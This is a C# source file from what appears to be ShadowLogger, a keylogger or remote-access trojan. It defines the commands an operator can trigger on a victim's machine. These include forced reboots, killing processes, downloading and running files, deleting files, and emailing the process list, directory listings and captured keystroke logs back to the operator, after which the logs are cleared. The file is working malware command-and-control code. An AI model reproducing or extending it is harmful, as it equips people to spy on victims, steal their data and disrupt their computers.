using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;
using ShadowLogger.bin.HelperMethods;
using System.IO;
using ShadowLogger.bin.Process_Management;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.Remote_Commands
{
    internal static class CommandsAvailable
    {
        internal static void Restart(bool elevate)
        {
            ApplicationMethods.RestartApplication(elevate);
        }

        internal static void Reboot()
        {
            //Reboots the computer immediately with no option to cancel.
            ProcessStartInfo pInfo = new ProcessStartInfo
            {
                FileName = "shutdown.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = "/r /f /t 0"
            };

            Process.Start(pInfo);
        }

        internal static void Site(string url)
        {
            if (!url.StartsWith("www.")) return; //Checks for null and validates url before proceding (It's not a fool-proof, you're free to change it)
            
            Process.Start(url);
        }

        internal static void ProcessKillByName(string name)
        {
            int[] pids = ProcessManagement.GetProcessIdsByName(name); // Gets all running processes id by name

            foreach (int pid in pids) //Iterates through each process id to terminate it
            {
                ProcessManagement.TerminateProcessById(pid);
            }
        }

        internal static void ProcessList()
        {
            string subject = String.Format(SharedMethods.GetMailSubject(), " - ## Process list ## Of ### ");
            SharedMethods.SendMail(subject, ProcessManagement.ListProcesses());
        }

        internal static void DlFile(bool overwrite)
        {
            CommandsAvailableHelperMethods.DlAndRun(overwrite);
        }

        internal static void ProcessStart(string[] filepaths, bool elevated)
        {
            foreach (string filepath in filepaths)
            {
                ProcessManagement.ExecuteFile(filepath, elevated);
            }
        }

        internal static void SendLogs()
        {
            SharedMethods.SendMail(string.Format(SharedMethods.GetMailSubject(), " - Logs of ### "));
            SharedMethods.ClearLogs();
        }

        internal static void Messagebox(string title, string body)
        {
            MessageBox.Show(body, title);
        }

        internal static void ProcessKillById(int id)
        {
            ProcessManagement.TerminateProcessById(id);
        }

        internal static void FileDelete(string filepath)
        {
            if (!File.Exists(filepath)) return;

            try
            {
                File.Delete(filepath);
            }
            catch (Exception ex)
            {
                SharedMethods.LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
            }
        }

        internal static void DirList(string directory)
        {
            if (!Directory.Exists(directory)) return;

            DirectoryInfo directoryinfo = new DirectoryInfo(directory);

            List<string> newString = new List<string>();
            foreach (FileInfo fileName in directoryinfo.GetFiles())
            {
                newString.Add(fileName.Name);
            }
            
            string subject = String.Format(SharedMethods.GetMailSubject(), " - ## Directory list ## Of ### ");
            string[] dirListArray = newString.ToArray();
            Array.Sort(dirListArray);
            string dirList = string.Join(Environment.NewLine, dirListArray);
            SharedMethods.SendMail(subject, dirList);
        }
    }
}
